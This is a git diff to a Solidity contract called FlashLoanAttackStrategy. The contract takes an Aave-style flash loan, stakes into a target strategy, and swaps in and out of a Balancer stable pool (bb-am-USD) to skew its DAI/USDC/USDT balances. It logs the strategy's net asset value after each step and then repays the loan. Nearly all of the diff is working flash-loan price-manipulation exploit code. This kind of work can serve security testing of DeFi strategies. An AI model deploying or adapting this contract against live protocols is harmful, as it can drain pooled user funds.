@@ -12,6 +12,9 @@ contract FlashLoanAttackStrategy is FlashLoanReceiverBase {
         address usdc;
         address usdt;
         address dai;
+        address amDai;
+        address amUsdc;
+        address amUsdt;
         address bbamUsdc;
         address bbamUsdt;
         address bbamDai;
@@ -27,6 +30,10 @@ contract FlashLoanAttackStrategy is FlashLoanReceiverBase {
     IERC20 public usdc;
     IERC20 public usdt;
     IERC20 public dai;
+
+    IERC20 public amDai;
+    IERC20 public amUsdc;
+    IERC20 public amUsdt;
 
     IBptToken public bbamUsdc;
     IBptToken public bbamUsdt;
@@ -58,6 +65,10 @@ contract FlashLoanAttackStrategy is FlashLoanReceiverBase {
         usdt = IERC20(params.usdt);
         dai = IERC20(params.dai);
 
+        amUsdc = IERC20(params.amUsdc);
+        amUsdt = IERC20(params.amUsdt);
+        amDai = IERC20(params.amDai);
+
         bbamUsdc = IBptToken(params.bbamUsdc);
         bbamUsdt = IBptToken(params.bbamUsdt);
         bbamDai = IBptToken(params.bbamDai);
@@ -76,9 +87,7 @@ contract FlashLoanAttackStrategy is FlashLoanReceiverBase {
         strategy = IStrategy(_strategy);
     }
 
-    /**
-        This function is called after your contract has received the flash loaned amount
-     */
+
     function executeOperation(
         address asset,
         uint256 amount,
@@ -91,55 +100,30 @@ contract FlashLoanAttackStrategy is FlashLoanReceiverBase {
     returns (bool)
     {
 
-        //
-        // This contract now has the funds requested.
-        // Your logic goes here.
-        //
-
-        // At the end of your logic above, this contract owes
-        // the flashloaned amounts + premiums.
-        // Therefore ensure your contract has enough to repay
-        // these amounts.
-
-        console.log("asset: %s", asset);
-        console.log("amount: %s", amount);
-        console.log("premium: %s", premium);
+        console.log("asset:     %s", asset);
+        console.log("amount:    %s", amount / 1e6);
+        console.log("premium:   %s", premium / 1e6);
         console.log("initiator: %s", initiator);
 
         usdc.transfer(address(strategy), putAmount);
         strategy.stake(address(usdc), putAmount);
-        console.log("strategy netAssetValue 1: %s", strategy.netAssetValue());
 
-        console.log("usdc balance before: %s", usdc.balanceOf(address(this)));
-        (IERC20[] memory tokens, uint256[] memory balances,) = vault.getPoolTokens(bbamUsdPoolId);
-        for (uint256 i; i < tokens.length; i++) {
-            console.log("token %s balance %s", address(tokens[i]), balances[i]);
-        }
+        showBalances('Stake to strategy');
+
         _stake(address(usdc), amount);
-        console.log("usdc balance after: %s", usdc.balanceOf(address(this)));
-        (tokens, balances,) = vault.getPoolTokens(bbamUsdPoolId);
-        for (uint256 i; i < tokens.length; i++) {
-            console.log("token %s balance %s", address(tokens[i]), balances[i]);
-        }
 
-//        strategy.unstake(address(usdc), putAmount * 99 / 100, address(strategy), false);
-//        console.log("usdc balance strategy after unstake: %s", usdc.balanceOf(address(strategy)));
-        console.log("strategy netAssetValue 2: %s", strategy.netAssetValue());
+        showBalances('Stake 10kk');
 
-        uint256 bptAmount = gauge.balanceOf(address(this));
-        console.log("bptAmount: %s", bptAmount);
-        _unstakeToken(address(usdc), bptAmount);
-        console.log("usdc balance after: %s", usdc.balanceOf(address(this)));
-        console.log("usdt balance after: %s", usdt.balanceOf(address(this)));
-        console.log("dai balance after: %s", dai.balanceOf(address(this)));
-        (tokens, balances,) = vault.getPoolTokens(bbamUsdPoolId);
-        for (uint256 i; i < tokens.length; i++) {
-            console.log("token %s balance %s", address(tokens[i]), balances[i]);
-        }
+        _unstakeToken(address(amDai), bpt.balanceOf(address(this)) / 2);
+        showBalances('Unstake DAI');
 
-        console.log("strategy netAssetValue 3: %s", strategy.netAssetValue());
+        _unstakeToken(address(amUsdt), bpt.balanceOf(address(this)));
+        showBalances('Unstake USDT');
 
-        console.log("usdc balance: %s", usdc.balanceOf(address(this)));
+        usdc.transfer(address(strategy), putAmount);
+        strategy.stake(address(usdc), putAmount);
+//        strategy.unstake(address(usdc), putAmount / 2, address(this), false);
+        showBalances('Stake/Unstake strategy');
 
         // Approve the LendingPool contract allowance to *pull* the owed amount
         IERC20(asset).approve(address(POOL), amount + premium);
@@ -159,6 +143,30 @@ contract FlashLoanAttackStrategy is FlashLoanReceiverBase {
         );
     }
 
+    function showBalances(string memory step) internal {
+
+        console.log(step);
+        console.log('Balances pool:');
+        (IERC20[] memory tokens, uint256[] memory balances,) = vault.getPoolTokens(bbamUsdPoolId);
+        for (uint256 i; i < tokens.length; i++) {
+
+            if(address(tokens[i]) == address(bbamDai)){
+                console.log("- DAI:  %s", balances[i] / 1e18);
+            }else if (address(tokens[i]) == address(bbamUsdc)){
+                console.log("- USDC: %s", balances[i] / 1e18);
+            }else if(address(tokens[i]) == address(bbamUsdt)){
+                console.log("- USDT: %s", balances[i] / 1e18);
+            }else {
+                console.log("- BPT:  %s", balances[i] / 1e18);
+            }
+        }
+
+        console.log('Common:');
+        console.log("- nav:  %s", strategy.netAssetValue() / 1e6);
+        console.log("- usdc: %s", usdc.balanceOf(address(this)) / 1e6);
+        console.log('');
+    }
+
     function _stake(
         address _asset,
         uint256 _amount
@@ -166,12 +174,6 @@ contract FlashLoanAttackStrategy is FlashLoanReceiverBase {
 
         require(_asset == address(usdc), "Some token not compatible");
 
-        // How it work?
-        // 1. Swap all USDC to bb-USDC
-        // 2. Stake bb-USDC to stable pool
-        // 3. Stake bpt tokens to gauge
-
-        //1. Before put liquidity to Stable pool need to swap USDC to bb-aUSDC (linear pool token)
         BalancerLibrary.swap(
             vault,
             IVault.SwapKind.GIVEN_IN,
@@ -214,19 +216,12 @@ contract FlashLoanAttackStrategy is FlashLoanReceiverBase {
         bbamUsdc.approve(address(vault), bbamUsdcAmount);
         vault.joinPool(bbamUsdPoolId, address(this), address(this), request);
 
-        // 3. Put bpt tokens to Gauge
-        uint256 bptAmount = bpt.balanceOf(address(this));
-        bpt.approve(address(gauge), bptAmount);
-        gauge.deposit(bptAmount);
     }
 
     function _unstakeToken(
         address _asset,
         uint256 _amount
     ) internal returns (uint256) {
-
-        // 1. Unstake bpt from Gauge
-        gauge.withdraw(_amount);
 
         IAsset[] memory assets = new IAsset[](4);
         uint256[] memory minAmountsOut = new uint256[](4);
@@ -242,15 +237,15 @@ contract FlashLoanAttackStrategy is FlashLoanReceiverBase {
         uint256 exitTokenIndex;
         IBptToken bbamToken;
         bytes32 bbamTokenPoolId;
-        if (_asset == address(dai)) {
+        if (_asset == address(amDai)) {
             exitTokenIndex = 0;
             bbamToken = bbamDai;
             bbamTokenPoolId = bbamDaiPoolId;
-        } else if (_asset == address(usdc)) {
+        } else if (_asset == address(amUsdc)) {
             exitTokenIndex = 1;
             bbamToken = bbamUsdc;
             bbamTokenPoolId = bbamUsdcPoolId;
-        } else if (_asset == address(usdt)) {
+        } else if (_asset == address(amUsdt)) {
             exitTokenIndex = 2;
             bbamToken = bbamUsdt;
             bbamTokenPoolId = bbamUsdtPoolId;
@@ -268,7 +263,7 @@ contract FlashLoanAttackStrategy is FlashLoanReceiverBase {
             address(bbamToken),
             _asset,
             bbamTokenPoolId,
-            bbamToken.balanceOf(address(this)),
+            bbamToken.balanceOf(address(this)) / 2,
             0,
             address(this),
             address(this)
